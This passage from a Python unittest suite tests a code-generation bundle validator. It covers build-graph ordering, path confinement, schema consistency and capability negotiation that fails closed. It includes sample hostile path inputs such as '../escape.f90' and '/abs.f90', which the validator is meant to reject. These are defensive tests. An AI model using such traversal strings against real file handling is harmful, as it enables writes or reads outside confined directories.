        # follow the DECLARED order — not a re-sorted one that happens to match the fixture.
        doc = _multi_node_bundle()
        doc["optimization_unit"]["members"] = [ADV, FLUX]  # reversed
        doc["target_lowering_plan"]["fusion"] = [{"members": [ADV, FLUX]}]
        self.assertEqual(cb.validate_bundle(doc), [])
        self.assertEqual(cb.optimization_unit_members(doc), (ADV, FLUX))
        graph = cb.derive_build_graph(doc, toolchain={})
        self.assertEqual([unit["object"] for unit in graph["compile_units"]], [
            "unit_types.o",
            "adv1d_model.o", "adv_flux_model.o",
            "adv1d_checks.o", "adv_flux_checks.o",
        ])

    def test_a_member_that_is_also_a_dependency_is_not_staged_twice(self) -> None:
        # When a multi-node unit absorbs one of the target's dependencies, that dependency's
        # implementation is in the bundle (its own model file); it must be excluded from the
        # staged closure, or `<spec_id>_model.o` collides / links twice.
        doc = _multi_node_bundle()  # members: adv_flux, adv1d
        graph = cb.derive_build_graph(doc, dependency_closure=(FLUX,), toolchain={})
        sources = [unit["source"] for unit in graph["compile_units"]]
        self.assertNotIn("staged:adv_flux_model.f90", sources)
        objects = graph["link"]["objects"]
        self.assertEqual(len(objects), len(set(objects)))  # no duplicate implementation
        self.assertEqual(objects.count("adv_flux_model.o"), 1)

    def test_non_member_dependencies_are_still_staged(self) -> None:
        doc = _multi_node_bundle()
        # closure deepest-first: base (index 0, staged) then FLUX (index 1, member) — the
        # member is shallower than the staged dep, so this is the buildable shape.
        graph = cb.derive_build_graph(
            doc, dependency_closure=("component/base@0.1.0", FLUX), toolchain={})
        sources = [unit["source"] for unit in graph["compile_units"]]
        self.assertIn("staged:base_model.f90", sources)          # a real dep, kept
        self.assertNotIn("staged:adv_flux_model.f90", sources)   # a member (FLUX), dropped
        # deepest-first staging still precedes the bundle files
        self.assertEqual(sources[0], "staged:base_model.f90")

    def test_a_unit_straddling_a_staged_dependency_is_rejected_with_edges(self) -> None:
        # A staged dependent that DEPENDS ON an absorbed member `use`s a module the bundle
        # provides but compiles first — an unbuildable straddle. Proven by dependency EDGES
        # (the flat closure's order is not ancestry). Absorb the dependent, or unfuse.
        doc = _multi_node_bundle()  # member component/adv_flux@0.1.0
        dependent = "component/dependent@0.1.0"
        with self.assertRaisesRegex(RuntimeError, "straddles a staged dependency"):
            cb.derive_build_graph(
                doc, dependency_closure=(FLUX, dependent), toolchain={},
                dependency_edges={dependent: {FLUX}})

    def test_independent_staged_branch_is_not_a_straddle(self) -> None:
        # The false positive a positional check would raise: a staged dependency ordered after
        # an absorbed member in the flat closure but with NO dependency on it. Accepted with or
        # without edges (position is not ancestry).
        doc = _multi_node_bundle()  # member component/adv_flux@0.1.0
        independent = "component/independent@0.1.0"
        self.assertTrue(cb.derive_build_graph(
            doc, dependency_closure=(FLUX, independent), toolchain={}))
        self.assertTrue(cb.derive_build_graph(
            doc, dependency_closure=(FLUX, independent), toolchain={},
            dependency_edges={independent: set()}))  # explicitly no dep on FLUX


class LogicalPathAdversarialTest(unittest.TestCase):
    """Every `logical_path` is relative, normalized, confined, and unique."""

    def test_hostile_paths_are_rejected_by_a_named_clause(self) -> None:
        # Each case names the clause it must trip, so no single rule is left resting on
        # another rule happening to reject the same string.
        cases = [
            ("../escape.f90", "must not contain a '.' or '..' segment"),
            ("..", "must not contain a '.' or '..' segment"),
            (".", "must not contain a '.' or '..' segment"),
            ("./x.f90", "must not contain a '.' or '..' segment"),
            ("a/../b.f90", "must not contain a '.' or '..' segment"),
            ("a/./b.f90", "must not contain a '.' or '..' segment"),
            ("/abs.f90", "must be relative (leading '/' is forbidden)"),
            ("a//b.f90", "must not contain an empty segment"),
            ("sub/", "must not contain an empty segment"),
            ("dir\\win.f90", "must use POSIX '/' separators"),
            ("", "must be a non-empty string"),
        ]
        for path, clause in cases:
            with self.subTest(path=path):
                violations = cb.logical_path_violations(path, language="fortran")
                self.assertTrue(any(clause in v for v in violations),
                                f"{path!r} must be rejected by {clause!r}, got {violations}")

    def test_unnormalized_paths_trip_the_normalization_clause(self) -> None:
        for path in ("./x.f90", "a/../b.f90", "a//b.f90", "sub/"):
            with self.subTest(path=path):
                self.assertTrue(any("must be normalized" in v
                                    for v in cb.logical_path_violations(path, language="fortran")))

    def test_confined_relative_paths_are_accepted(self) -> None:
        for path in ("adv1d_model.f90", "core/adv1d_model.f90", "a/b/c/x_util.f90",
                     "with-dash.f90", "with.dots.f90", "_leading.f90", "0start.f90"):
            with self.subTest(path=path):
                self.assertEqual(cb.logical_path_violations(path, language="fortran"), [], path)

    def test_non_string_path_is_a_clause_not_an_exception(self) -> None:
        self.assertEqual(cb.logical_path_violations(None, language="fortran"),
                         ["logical_path must be a non-empty string"])
        self.assertEqual(cb.logical_path_violations(42, language="fortran"),
                         ["logical_path must be a non-empty string"])

    def test_case_folded_duplicates_are_rejected(self) -> None:
        doc = _minimal_bundle()
        doc["files"].append(_file("ADV1D_MODEL.f90", "helper", ADV))
        violations = cb.validate_bundle(doc)
        self.assertTrue(any("after case folding" in v for v in violations))

    def test_exact_duplicate_path_is_rejected(self) -> None:
        doc = _minimal_bundle()
        doc["files"].append(_file("adv1d_model.f90", "helper", ADV))
        self.assertTrue(any("after case folding" in v for v in cb.validate_bundle(doc)))

    def test_unknown_language_has_no_extension_allowlist(self) -> None:
        violations = cb.logical_path_violations("adv1d_model.f90", language="rust")
        self.assertTrue(any("no extension allowlist for language" in v for v in violations))


class ContractPlumbingTest(unittest.TestCase):
    """The schema, the module constants, and the document agree; hostile input yields
    clauses, never exceptions."""

    def setUp(self) -> None:
        self.schema = cb.load_bundle_schema()
        self.capability_schema = cb.load_harness_capabilities_schema()

    def _files_property(self, name: str) -> dict:
        return self.schema["properties"]["files"]["items"]["properties"][name]

    def test_schema_role_enum_matches_the_module(self) -> None:
        role = self._files_property("role")
        self.assertEqual(tuple(role["enum"]), cb.FILE_ROLES)
        self.assertEqual(sorted(role["x-entrypoint-bearing-roles"]),
                         sorted(set(cb.ROLE_FOR_ENTRYPOINT_KIND.values())))
        self.assertEqual(sorted(role["x-unit-shareable-roles"]), sorted(cb.UNIT_SHAREABLE_ROLES))
        self.assertEqual(sorted(cb.ROLE_BUILD_PRECEDENCE), sorted(cb.FILE_ROLES))

    def test_schema_language_and_extension_allowlist_match_the_module(self) -> None:
        language = self._files_property("language")
        self.assertEqual(tuple(language["enum"]), cb.LANGUAGES)
        self.assertEqual(
            {k: tuple(v) for k, v in language["x-extension-allowlist"].items()},
            cb.LANGUAGE_EXTENSION_ALLOWLIST)

    def test_schema_patterns_match_the_module(self) -> None:
        logical_path = self._files_property("logical_path")
        self.assertEqual(logical_path["x-segment-pattern"], cb.LOGICAL_PATH_SEGMENT_PATTERN)
        # The whole-path pattern is a second copy of the grammar and must not drift from it.
        self.assertEqual(logical_path["pattern"], cb.LOGICAL_PATH_PATTERN)
        self.assertEqual(self.schema["definitions"]["capability_token"]["pattern"],
                         cb.CAPABILITY_TOKEN_PATTERN)
        self.assertEqual(self.schema["definitions"]["node_key"]["pattern"], cb.NODE_KEY_PATTERN)
        # the schema pins the supported major (not the module's generic SEMVER_PATTERN), so a
        # schema-only consumer rejects an incompatible major at the schema boundary
        self.assertEqual(self.schema["properties"]["bundle_schema_version"]["pattern"],
                         cb.BUNDLE_SCHEMA_VERSION_PATTERN)
        self.assertEqual(cb.BUNDLE_SCHEMA_VERSION_PATTERN, r"^1\.[0-9]+\.[0-9]+(?![\s\S])")

    def test_schema_patterns_use_portable_end_of_string_anchor(self) -> None:
        # `^` … `(?![\s\S])`, not `^` … `$`: under Python regex `$` also matches before a
        # trailing newline (the jsonschema library applies the pattern with re.search), while
        # `\A` / `\Z` are invalid in ECMA-262 (Ajv). The negative lookahead means "true end of
        # string" and is valid and identical in both engines.
        pattern_holders = [
            self.schema["properties"]["bundle_schema_version"],
            self.schema["definitions"]["node_key"],
            self.schema["definitions"]["capability_token"],
            self.schema["properties"]["files"]["items"]["properties"]["logical_path"],
            self.schema["properties"]["entrypoints"]["items"]["properties"]["symbol"],
            self.schema["properties"]["entrypoints"]["items"]["properties"]["module"],
            self.capability_schema["definitions"]["capability_token"],
            self.capability_schema["properties"]["manifests"]["items"]["properties"]["node_key"],
        ]
        for holder in pattern_holders:
            pattern = holder["pattern"]
            with self.subTest(pattern=pattern):
                self.assertNotIn(r"\A", pattern)
                self.assertNotIn(r"\Z", pattern)
                self.assertTrue(pattern.startswith("^"))
                self.assertTrue(pattern.endswith(r"(?![\s\S])"))

    def test_every_schema_pattern_uses_the_portable_anchor(self) -> None:
        # A lint over EVERY `pattern` in both schemas (not a hardcoded list), so a future
        # author who adds a pattern anchored with `$` / `\A` / `\Z` is caught at PR time.
        def patterns(node: object):
            if isinstance(node, dict):
                if isinstance(node.get("pattern"), str):
                    yield node["pattern"]
                for value in node.values():
                    yield from patterns(value)
            elif isinstance(node, list):
                for item in node:
                    yield from patterns(item)

        found = 0
        for schema in (self.schema, self.capability_schema):
            for pattern in patterns(schema):
                found += 1
                with self.subTest(pattern=pattern):
                    self.assertNotIn("$", pattern)
                    self.assertNotIn(r"\A", pattern)
                    self.assertNotIn(r"\Z", pattern)
                    self.assertTrue(pattern.startswith("^") and pattern.endswith(r"(?![\s\S])"),
                                    f"{pattern!r} must anchor with '^' … '(?![\\s\\S])'")
        self.assertGreaterEqual(found, 8)  # the walk actually reached the patterns

    def test_node_key_pattern_agrees_with_the_workflow_parser(self) -> None:
        # The codegen node_key grammar must match the repository's canonical parser
        # tools/orchestration_runtime.py:_parse_node_key_strict, or a bundle the workflow
        # accepts would be rejected here (or vice versa).
        from tools.orchestration_runtime import _parse_node_key_strict
        pattern = re.compile(cb.NODE_KEY_PATTERN)

        def parser_accepts(nk: str) -> bool:
            try:
                _parse_node_key_strict(nk)
                return True
            except ValueError:
                return False

        samples = [
            "problem/adv1d@0.1.0", "component/adv.flux@0.1.0", "component/foo@1.0.0-rc1",
            "problem/adv1d@1.2", "infrastructure/harness_fortran_cpu@0.3.0",
            "problem/Adv1d@0.1.0", "problem/adv-1d@0.1.0", "problem/.adv1d@0.1.0",
            "problem/adv1d@", "problem/adv1d", "garbage",
            # the one kind the codegen pattern is deliberately narrower on: a non-catalogued
            # spec_kind. The parser accepts any lowercase kind; the codegen pattern pins the 4.
        ]
        for nk in samples:
            regex_ok = bool(pattern.fullmatch(nk))
            parser_ok = parser_accepts(nk)
            with self.subTest(node_key=nk):
                # For the four real spec_kinds the two must agree.
                if nk.split("/", 1)[0] in ("problem", "component", "profile", "infrastructure"):
                    self.assertEqual(regex_ok, parser_ok,
                                     f"codegen pattern and parser disagree on {nk!r}")

    def test_schema_pattern_rejects_a_trailing_newline_under_search(self) -> None:
        # Reproduce the jsonschema-library boundary: re.search with the pattern.
        version = self.schema["properties"]["bundle_schema_version"]["pattern"]
        token = self.schema["definitions"]["capability_token"]["pattern"]
        node = self.schema["definitions"]["node_key"]["pattern"]
        for pattern, good in ((version, "1.0.0"), (token, "sync_single_case@1"),
                             (node, "problem/adv1d@0.1.0")):
            compiled = re.compile(pattern)
            self.assertTrue(compiled.search(good))
            self.assertIsNone(compiled.search(good + "\n"))
            self.assertIsNone(compiled.search("\n" + good))
        entrypoint = self.schema["properties"]["entrypoints"]["items"]["properties"]
        self.assertEqual(entrypoint["symbol"]["pattern"], cb.IDENTIFIER_PATTERN)
        self.assertEqual(tuple(entrypoint["kind"]["enum"]), cb.ENTRYPOINT_KINDS)
        self.assertEqual(entrypoint["kind"]["x-role-for-kind"], cb.ROLE_FOR_ENTRYPOINT_KIND)
        binding = self.schema["properties"]["state_bindings"]["items"]["properties"]
        for key in ("state_variable", "storage_symbol"):
            self.assertEqual(binding[key]["pattern"], cb.IDENTIFIER_PATTERN)
        self.assertEqual(
            self.capability_schema["properties"]["manifests"]["items"]["properties"]["node_key"]
            ["pattern"],
            cb.NODE_KEY_PATTERN.replace("(problem|component|profile|infrastructure)",
                                        "infrastructure"))

    def test_schema_cardinality_constraints_are_declared(self) -> None:
        # A generic JSON Schema consumer must get the same non-empty / duplicate-free
        # guarantees the canonical validator enforces (x-forbidden-examples-note promises
        # the field grammar to such a consumer). Asserted by VALUE: `minItems: 0` would
        # satisfy a presence check while declaring nothing.
        properties = self.schema["properties"]
        members = properties["optimization_unit"]["properties"]["members"]
        fusion_members = (properties["target_lowering_plan"]["properties"]["fusion"]["items"]
                          ["properties"]["members"])
        for node, unique in ((members, True), (properties["files"], False),
                             (properties["entrypoints"], False),
                             (properties["capability_requirements"], True),
                             (fusion_members, False)):
            self.assertEqual(node["minItems"], 1)
            if unique:
                self.assertIs(node["uniqueItems"], True)
        # the item grammars keep their $ref (a bare {"type": "string"} declares nothing)
        self.assertEqual(members["items"], {"$ref": "#/definitions/node_key"})
        self.assertEqual(fusion_members["items"], {"$ref": "#/definitions/node_key"})
        self.assertEqual(properties["capability_requirements"]["items"],
                         {"$ref": "#/definitions/capability_token"})
        self.assertEqual(self._files_property("content")["minLength"], 1)
        self.assertEqual(self._files_property("logical_path")["minLength"], 1)
        entrypoint_items = properties["entrypoints"]["items"]
        self.assertEqual(entrypoint_items["properties"]["defined_in"]["minLength"], 1)
        # member_node_key keeps the node_key GRAMMAR in its nullable branch
        self.assertEqual(self._files_property("member_node_key")["oneOf"],
                         [{"$ref": "#/definitions/node_key"}, {"type": "null"}])
        self.assertEqual(
            properties["state_bindings"]["items"]["properties"]["capability"]["oneOf"],
            [{"$ref": "#/definitions/capability_token"}, {"type": "null"}])

    def test_schema_required_lists_match_the_module(self) -> None:
        properties = self.schema["properties"]
        entrypoint_properties = properties["entrypoints"]["items"]["properties"]
        binding_properties = properties["state_bindings"]["items"]["properties"]
        # the node_key GRAMMAR, not merely "a string", on every node_key-bearing field
        self.assertEqual(entrypoint_properties["node_key"], {"$ref": "#/definitions/node_key"})
        self.assertEqual(binding_properties["node_key"], {"$ref": "#/definitions/node_key"})
        self.assertEqual(
            properties["target_lowering_plan"]["properties"]["fusion"]["items"]["required"],
            ["members"])
        self.assertEqual(sorted(properties["entrypoints"]["items"]["required"]),
                         ["defined_in", "kind", "module", "node_key", "symbol"])
        self.assertEqual(
            properties["entrypoints"]["items"]["properties"]["module"]["pattern"],
            cb.IDENTIFIER_PATTERN)
        self.assertEqual(sorted(properties["state_bindings"]["items"]["required"]),
                         ["capability", "capture", "module", "node_key", "state_variable",
                          "storage_symbol"])
        self.assertEqual(
            properties["state_bindings"]["items"]["properties"]["module"]["pattern"],
            cb.IDENTIFIER_PATTERN)
        capability = self.capability_schema["properties"]
        self.assertEqual(sorted(self.capability_schema["required"]),
                         ["harness_capability_abi_version", "manifests"])
        self.assertEqual(capability["harness_capability_abi_version"]["type"], "integer")
        self.assertEqual(capability["harness_capability_abi_version"]["minimum"],
                         cb.HARNESS_CAPABILITY_ABI_VERSION)
        # a PIN, not a floor: the declarative copy says const, as the validator does
        self.assertEqual(capability["harness_capability_abi_version"]["const"],
                         cb.HARNESS_CAPABILITY_ABI_VERSION)
        manifest_items = capability["manifests"]["items"]
        self.assertEqual(sorted(manifest_items["required"]), ["node_key", "provides"])
        self.assertEqual(capability["manifests"]["minItems"], 1)
        provides = manifest_items["properties"]["provides"]
        self.assertEqual(provides["minItems"], 1)
        self.assertIs(provides["uniqueItems"], True)
        self.assertEqual(provides["items"], {"$ref": "#/definitions/capability_token"})

    def test_forbidden_example_corpus_is_complete(self) -> None:
        # The corpus is the agent-facing teaching surface; a deleted entry silently narrows
        # what an author is shown to be forbidden.
        paths = {example.get("logical_path") for example in self.schema["x-forbidden-examples"]}
        self.assertLessEqual(
            {"../escape.f90", "/abs.f90", "a/../b.f90", "a//b.f90", "dir\\win.f90", "./x.f90",
             "Makefile", "build.sh", "A.f90"},
            paths)
        keys = {key for example in self.schema["x-forbidden-examples"] for key in example}
        self.assertLessEqual(
            {"role", "build_commands", "compile_flags", "capability_requirements", "defined_in"},
            keys)
        capability_keys = {key for example in self.capability_schema["x-forbidden-examples"]
                           for key in example}
        self.assertLessEqual({"provides", "node_key"}, capability_keys)

    def test_canonical_validators_exist(self) -> None:
        for schema in (self.schema, self.capability_schema):
            module, _, function = schema["x-canonical-validator"].partition(":")
            self.assertEqual(module, "tools/codegen_bundle.py")
            self.assertTrue(callable(getattr(cb, function)), function)

    def test_schema_key_sets_match_the_module(self) -> None:
        self.assertEqual(tuple(self.schema["required"]), cb.REQUIRED_BUNDLE_KEYS)
        self.assertEqual(sorted(self.schema["properties"]),
                         sorted(cb.REQUIRED_BUNDLE_KEYS + cb.OPTIONAL_BUNDLE_KEYS))
        # files[] item property set: the 6 required fields + the optional compile_after. The
        # module's _closed_object_violations enforces exactly this closed set.
        files_items = self.schema["properties"]["files"]["items"]
        self.assertEqual(
            sorted(files_items["properties"]),
            sorted(["logical_path", "role", "language", "member_node_key", "content", "modules",
                    "compile_after"]))
        self.assertEqual(
            sorted(files_items["required"]),
            sorted(["logical_path", "role", "language", "member_node_key", "content", "modules"]))
        self.assertEqual(files_items["properties"]["modules"]["items"]["pattern"],
                         cb.IDENTIFIER_PATTERN)
        self.assertEqual(files_items["properties"]["modules"]["minItems"], 1)
        self.assertEqual(files_items["properties"]["compile_after"]["items"],
                         {"type": "string", "minLength": 1})
        plan = self.schema["properties"]["target_lowering_plan"]
        self.assertEqual(tuple(plan["required"]), cb.LOWERING_PLAN_REQUIRED_KEYS)
        self.assertEqual(
            sorted(plan["properties"]),
            sorted(cb.LOWERING_PLAN_REQUIRED_KEYS + cb.LOWERING_PLAN_OPTIONAL_KEYS))
        self.assertEqual(tuple(plan["properties"]["state_residency"]["enum"]), cb.STATE_RESIDENCIES)
        self.assertEqual(plan["properties"]["state_residency"]["x-required-capability-name"],
                         cb.RESIDENCY_REQUIRED_CAPABILITY)

    def test_schema_state_binding_capture_matches_the_module(self) -> None:
        binding = self.schema["properties"]["state_bindings"]["items"]["properties"]
        self.assertEqual(tuple(binding["capture"]["enum"]), cb.STATE_CAPTURES)
        self.assertEqual(binding["capture"]["x-capability-name-for-capture"],
                         cb.CAPABILITY_FOR_CAPTURE)

    def test_schema_version_marker_matches_the_module(self) -> None:
        self.assertEqual(
            self.schema["properties"]["bundle_schema_version"]["x-current-version"],
            cb.CODEGEN_BUNDLE_SCHEMA_VERSION)

    def test_capability_schema_vocabulary_matches_the_module(self) -> None:
        token = self.capability_schema["definitions"]["capability_token"]
        self.assertEqual(sorted(token["x-capability-vocabulary"]), sorted(cb.CAPABILITY_VOCABULARY))
        self.assertEqual(sorted(token["x-execution-model-capabilities"]),
                         sorted(cb.EXECUTION_MODEL_CAPABILITIES))
        self.assertEqual(token["pattern"], cb.CAPABILITY_TOKEN_PATTERN)

    def test_manifest_document_conforms_to_its_schema_shape(self) -> None:
        doc = cb.harness_capability_manifest_document()
        self.assertEqual(doc["harness_capability_abi_version"], cb.HARNESS_CAPABILITY_ABI_VERSION)
        node_key_re = re.compile(
            self.capability_schema["properties"]["manifests"]["items"]["properties"]["node_key"]
            ["pattern"])
        token_re = re.compile(self.capability_schema["definitions"]["capability_token"]["pattern"])
        self.assertTrue(doc["manifests"])
        for manifest in doc["manifests"]:
            self.assertRegex(manifest["node_key"], node_key_re)
            for token in manifest["provides"]:
                self.assertRegex(token, token_re)
                self.assertIn(cb.capability_name(token), cb.CAPABILITY_VOCABULARY)

    def test_schema_positive_example_validates(self) -> None:
        # The schema ships the canonical example an author copies; if it rots into an
        # invalid bundle, the contract teaches the wrong shape.
        self.assertTrue(self.schema["examples"])
        self.assertTrue(self.capability_schema["examples"])
        for example in self.schema["examples"]:
            self.assertEqual(cb.validate_bundle(example), [])
        for example in self.capability_schema["examples"]:
            self.assertEqual(cb.harness_capability_manifest_violations(example), [])

    def test_schema_forbidden_examples_are_rejected(self) -> None:
        # Every x-forbidden-examples entry must actually be rejected — by the field grammar
        # where a pattern can carry it, by the canonical validator otherwise (the split is
        # declared in x-forbidden-examples-note).
        self.assertTrue(self.schema["x-forbidden-examples"])
        for example in self.schema["x-forbidden-examples"]:
            note = example["note"]
            with self.subTest(note=note):
                path = example.get("logical_path")
                if path is not None:
                    if cb.logical_path_violations(path, language="fortran"):
                        continue  # rejected by the field grammar
                    # The ONLY path rule the field grammar cannot carry alone is the
                    # case-folded duplicate, so a surviving example must be one — a
                    # forbidden example the contract in fact accepts is a contract defect.
                    self.assertNotEqual(
                        path.casefold(), path,
                        f"forbidden example {path!r} is accepted: it is neither rejected by "
                        "logical_path_violations nor a case-folded duplicate")
                    doc = _minimal_bundle()
                    doc["files"] += [_file(path.casefold(), "helper", ADV),
                                     _file(path, "helper", ADV)]
                    self.assertNotEqual(cb.validate_bundle(doc), [], note)
                    continue
                doc = _minimal_bundle()
                if "role" in example:
                    doc["files"].append(_file("extra_unit.f90", example["role"], ADV))
                elif "capability_requirements" in example:
                    doc["capability_requirements"] = example["capability_requirements"]
                elif "defined_in" in example:
                    doc["files"].append(_file("adv1d_limiter.f90", "helper", ADV))
                    doc["entrypoints"].append(
                        {"symbol": "adv1d__limit", "kind": example["kind"], "node_key": ADV,
                         "defined_in": example["defined_in"], "module": "adv1d_limiter"})
                else:  # a command-bearing top-level key: rejected by the closed object
                    for key, value in example.items():
                        if key != "note":
                            doc[key] = value
                self.assertNotEqual(cb.validate_bundle(doc), [], note)

    def test_capability_schema_forbidden_examples_are_rejected(self) -> None:
        self.assertTrue(self.capability_schema["x-forbidden-examples"])
        for example in self.capability_schema["x-forbidden-examples"]:
            with self.subTest(note=example["note"]):
                doc = cb.harness_capability_manifest_document()
                for key in ("provides", "node_key"):
                    if key in example:
                        doc["manifests"][0][key] = example[key]
                self.assertNotEqual(cb.harness_capability_manifest_violations(doc), [])

    @staticmethod
    def _schema_nodes(node: dict, path: str) -> "list[tuple[str, dict]]":
        """Every node in schema position (the root, each property, each `items`, each
        `oneOf` branch, each definition) — the nodes that constrain an instance."""
        found = [(path, node)]
        for container in ("properties", "definitions"):
            for name, child in (node.get(container) or {}).items():
                found += ContractPlumbingTest._schema_nodes(child, f"{path}.{container}.{name}")
        items = node.get("items")
        if isinstance(items, dict):
            found += ContractPlumbingTest._schema_nodes(items, f"{path}.items")
        for index, branch in enumerate(node.get("oneOf") or []):
            found += ContractPlumbingTest._schema_nodes(branch, f"{path}.oneOf[{index}]")
        return found

    def test_every_schema_node_declares_a_type(self) -> None:
        # Without an explicit `type`, a draft-07 sibling constraint (pattern, minItems,
        # items, minLength) is vacuous for a wrongly-typed instance: `"content": {...}` or
        # `"logical_path": [...]` would validate. A node constrains by `type`, `$ref`, or
        # `oneOf` — never by nothing.
        for schema, name in ((self.schema, "codegen_bundle"),
                             (self.capability_schema, "harness_capabilities")):
            for path, node in self._schema_nodes(schema, name):
                with self.subTest(path=path):
                    self.assertTrue(
                        {"type", "$ref", "oneOf"} & set(node),
                        f"{path} constrains nothing: it declares no type, $ref, or oneOf")

    def test_schema_objects_are_closed_except_the_declared_extension_point(self) -> None:
        # "The bundle cannot smuggle a build command" rests on the closure of every object,
        # and the ONE open region is a contract decision (the A5 target-backend extension
        # point), so it is pinned as an allowlist rather than left incidental.
        open_objects = set()
        for schema, name in ((self.schema, "codegen_bundle"),
                             (self.capability_schema, "harness_capabilities")):
            for path, node in self._schema_nodes(schema, name):
                if node.get("type") != "object":
                    continue
                if node.get("additionalProperties") is False:
                    continue
                open_objects.add(path)
        plan = "codegen_bundle.properties.target_lowering_plan.properties"
        self.assertEqual(open_objects, {
            f"{plan}.precision", f"{plan}.data_layout", f"{plan}.parallelization",
            f"{plan}.decomposition", f"{plan}.communication", f"{plan}.accelerator_mapping",
        })
        # and every open one is a lowering-plan VALUE: it declares no properties of its own
        for path in open_objects:
            node = dict(self._schema_nodes(self.schema, "codegen_bundle"))[path]
            self.assertNotIn("properties", node)

    def test_schema_declares_the_field_grammar_it_claims(self) -> None:
        files_items = self.schema["properties"]["files"]["items"]
        self.assertEqual(
            sorted(files_items["required"]),
            sorted(["logical_path", "role", "language", "member_node_key", "content", "modules"]))
        self.assertIn("pattern", files_items["properties"]["logical_path"])
        self.assertTrue(self.schema["x-forbidden-examples-note"])
        self.assertTrue(self.capability_schema["x-forbidden-examples-note"])

    def test_node_key_pattern_accepts_every_catalogued_node(self) -> None:
        # The pattern is a module constant; the catalog is the ground truth it must not
        # drift from (a false reject here fails a real node closed).
        catalog = (Path(__file__).resolve().parents[2] / "spec" / "registry"
                   / "spec_catalog.yaml").read_text(encoding="utf-8")
        kinds = re.findall(r"- spec_kind:\s*(\S+)\s*\n\s*spec_id:\s*(\S+)\s*\n\s*spec_version:\s*(\S+)",
                           catalog)
        self.assertTrue(kinds)
        for kind, spec_id, version in kinds:
            with self.subTest(node=f"{kind}/{spec_id}@{version}"):
                self.assertRegex(f"{kind}/{spec_id}@{version}", re.compile(cb.NODE_KEY_PATTERN))

    def test_negotiation_survives_hostile_input(self) -> None:
        # A caller may negotiate before validating, so untrusted shapes must yield a result —
        # and every reported element is a string, so a caller may join them.
        self.assertEqual(cb.unsatisfied_capability_requirements(["sync_single_case@1"], [[], {}]),
                         ["sync_single_case@1"])
        self.assertEqual(cb.unsatisfied_capability_requirements([None, 7], None), ["None", "7"])
        self.assertEqual(cb.unsatisfied_capability_requirements(["sync_single_case@1"], 5),
                         ["sync_single_case@1"])
        for result in (cb.unsatisfied_capability_requirements(None, None),
                       cb.unsatisfied_capability_requirements(5, None)):
            self.assertTrue(all(isinstance(token, str) for token in result))

    def test_a_provided_entry_that_is_not_a_token_string_satisfies_nothing(self) -> None:
        # `provided` entries are filtered to strings: an object whose __str__ or __eq__
        # mimics a token must not satisfy a requirement.
        class Mimic:
            def __str__(self) -> str:
                return "sync_single_case@1"

            def __eq__(self, other: object) -> bool:
                return other == "sync_single_case@1"

            def __hash__(self) -> int:
                return hash("sync_single_case@1")

        self.assertEqual(
            cb.unsatisfied_capability_requirements(["sync_single_case@1"], [Mimic()]),
            ["sync_single_case@1"])

    def test_negotiation_never_fails_open(self) -> None:
        # The failure direction of a negotiation gate is always CLOSED. A set is a legal
        # Iterable[str] (harness_provided_capabilities returns a frozenset); a bare string is
        # one malformed token; None and a number are not token collections at all. None of
        # them may read as "nothing required".
        provided = cb.harness_provided_capabilities(HARNESS)
        self.assertEqual(
            cb.unsatisfied_capability_requirements({"sync_single_case@2"}, provided),
            ["sync_single_case@2"])
        self.assertEqual(
            cb.unsatisfied_capability_requirements(frozenset({"gpu_magic@1"}), provided),
            ["gpu_magic@1"])
        self.assertEqual(
            cb.unsatisfied_capability_requirements((t for t in ["state_registration@1"]), provided),
            ["state_registration@1"])
        self.assertEqual(
            cb.unsatisfied_capability_requirements("state_registration@1", provided),
            ["state_registration@1"])
        self.assertEqual(cb.unsatisfied_capability_requirements(None, provided), ["None"])
        self.assertEqual(cb.unsatisfied_capability_requirements(5, provided), ["5"])
        # a satisfied set still negotiates cleanly
        self.assertEqual(cb.unsatisfied_capability_requirements({"sync_single_case@1"}, provided), [])

    def test_a_mapping_is_not_a_token_collection(self) -> None:
        # Iterating a dict yields its KEYS: a mapping on either side must not be read as
        # tokens, or `provided={"sync_single_case@1": false}` would silently satisfy it.
        provided = cb.harness_provided_capabilities(HARNESS)
        self.assertEqual(cb.unsatisfied_capability_requirements({}, provided), ["{}"])
        self.assertEqual(
            cb.unsatisfied_capability_requirements({"gpu_magic@1": 1}, set()),
            ["{'gpu_magic@1': 1}"])
        # a mapping as `provided` provides NOTHING — the requirement stays unsatisfied
        self.assertEqual(
            cb.unsatisfied_capability_requirements(
                ["sync_single_case@1"], {"sync_single_case@1": False}),
            ["sync_single_case@1"])

    def test_empty_requirements_fail_closed(self) -> None:
        # An empty requirement set is never valid in this contract (a bundle declares at least
        # one execution-model capability); reading empty as "satisfied" would be a fail-open.
        for empty in ([], (), set(), (x for x in [])):
            with self.subTest(kind=type(empty).__name__):
                result = cb.unsatisfied_capability_requirements(empty, {"sync_single_case@1"})
                self.assertEqual(result, ["capability_requirements must declare at least one capability"])

    def test_unordered_requirements_report_deterministically(self) -> None:
        # A set carries no order; the report must not depend on the hash seed. Enough
        # elements that an unsorted report cannot land in sorted order by chance.
        required = {f"gpu_{letter}@1" for letter in "abcdefgh"}
        self.assertEqual(cb.unsatisfied_capability_requirements(required, frozenset()),
                         sorted(required))

    def test_ordered_requirements_keep_requirement_order(self) -> None:
        # Every iterable that HAS an order keeps it — only a set is re-ordered.
        tokens = ["sync_single_case@1", "state_registration@1", "full_state_capture@1"]
        for required in (tokens, tuple(tokens), iter(tokens), (t for t in tokens)):
            with self.subTest(kind=type(required).__name__):
                self.assertEqual(cb.unsatisfied_capability_requirements(required, None), tokens)

    def test_schemas_cross_reference_the_contract(self) -> None:
        for schema in (self.schema, self.capability_schema):
            self.assertEqual(schema["x-canonical-doc"],
                             "docs/workflow/CODEGEN_BUNDLE_CONTRACT.md")
            self.assertTrue(schema["x-canonical-validator"].startswith("tools/codegen_bundle.py:"))

    def test_schema_loader_observes_an_edit_at_the_same_path(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "s.json"
            path.write_text('{"title": "one"}', encoding="utf-8")
            self.assertEqual(cb._load_schema_cached(str(path))["title"], "one")
            path.write_text('{"title": "two"}', encoding="utf-8")
            # content-keyed cache: a rebase / repair at the same path must be observed
            self.assertEqual(cb._load_schema_cached(str(path))["title"], "two")

    def test_schema_loader_observes_an_mtime_preserving_replacement(self) -> None:
        # A metadata-preserving deploy (or a coarse-resolution filesystem) can replace the
        # file while keeping st_mtime_ns; the content-hash cache must still observe it.
        import os
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "s.json"
            path.write_text('{"title": "one"}', encoding="utf-8")
            mtime = path.stat().st_mtime_ns
            self.assertEqual(cb._load_schema_cached(str(path))["title"], "one")
